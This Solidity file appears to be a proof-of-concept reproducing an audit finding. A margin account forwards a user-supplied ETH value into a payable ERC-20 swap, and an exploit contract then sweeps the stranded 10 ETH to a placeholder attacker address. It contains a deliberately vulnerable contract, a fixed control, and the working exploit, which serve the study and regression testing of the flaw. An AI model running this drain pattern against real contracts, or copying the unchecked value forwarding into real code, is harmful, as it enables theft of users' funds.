// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Arkis — native margin drain (Trail of Bits, 2024-12)
    CommandSafeExecutor copies the user command's value onto the call and
    does not check it. swapExactTokensForTokens is payable and leaves msg.value
    in the router. A follow-up swapExactETHForTokens sends that ETH to the attacker.
    10 ETH of margin-account leverage is drained. The control forces value to 0
    on an ERC-20 swap, and the 10 ETH stays in the account. */

contract Router {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256)
        external
        payable
        returns (uint256[] memory amounts)
    {
        amounts = new uint256[](2);
    }

    function swapExactETHForTokens(address to) external {
        uint256 bal = address(this).balance;
        (bool ok,) = to.call{value: bal}("");
        require(ok, "sweep");
    }

    receive() external payable {}
}

struct Command {
    address target;
    uint256 value;
    bytes data;
}

contract MarginAccount {
    function execute(Command calldata _cmd, bytes memory _encodedCmds) external {
        Command[] memory cmdsToExecute = abi.decode(_encodedCmds, (Command[]));
        uint256 n = cmdsToExecute.length;
        // @> VULN: the user command's value is forwarded. An ERC-20 swap does not refund it.
        cmdsToExecute[n - 1].value = _cmd.value;
        // FIX: compliance must reject a non-zero value on a call that does not spend native ETH.
        address target = cmdsToExecute[n - 1].target;
        uint256 value = cmdsToExecute[n - 1].value;
        bytes memory data = cmdsToExecute[n - 1].data;
        require(value == _cmd.value, "value dropped");
        (bool ok,) = target.call{value: value}(data);
        require(ok, "call");
    }

    receive() external payable {}
}

contract MarginAccountFixed {
    function execute(Command calldata _cmd, bytes memory _encodedCmds) external {
        Command[] memory cmdsToExecute = abi.decode(_encodedCmds, (Command[]));
        cmdsToExecute[cmdsToExecute.length - 1].value = 0;
        _cmd;
        for (uint256 i; i < cmdsToExecute.length; ++i) {
            (bool ok,) = cmdsToExecute[i].target.call{value: cmdsToExecute[i].value}(cmdsToExecute[i].data);
            require(ok, "call");
        }
    }

    receive() external payable {}
}

contract Exploit {
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    Router public router; // nonce 1
    MarginAccount public margin; // nonce 2

    constructor() {
        router = new Router();
        margin = new MarginAccount();
    }

    function run() external {
        uint256 loot = address(margin).balance;
        require(loot == 10 ether, "prefund");
        bytes memory payload = abi.encodeWithSelector(
            Router.swapExactTokensForTokens.selector,
            uint256(1),
            uint256(0),
            new address[](0),
            address(margin),
            block.timestamp
        );
        Command[] memory cmds = new Command[](1);
        cmds[0].target = address(router);
        cmds[0].value = 0;
        cmds[0].data = payload;
        Command memory cmd;
        cmd.target = address(router);
        cmd.value = loot;
        cmd.data = payload;
        margin.execute(cmd, abi.encode(cmds));
        require(address(router).balance == loot, "router holds the eth");
        require(address(margin).balance == 0, "margin still funded");
        router.swapExactETHForTokens(ATTACKER);
        require(address(router).balance == 0, "router not swept");
        require(ATTACKER.balance >= loot, "attacker was not paid");
    }
}
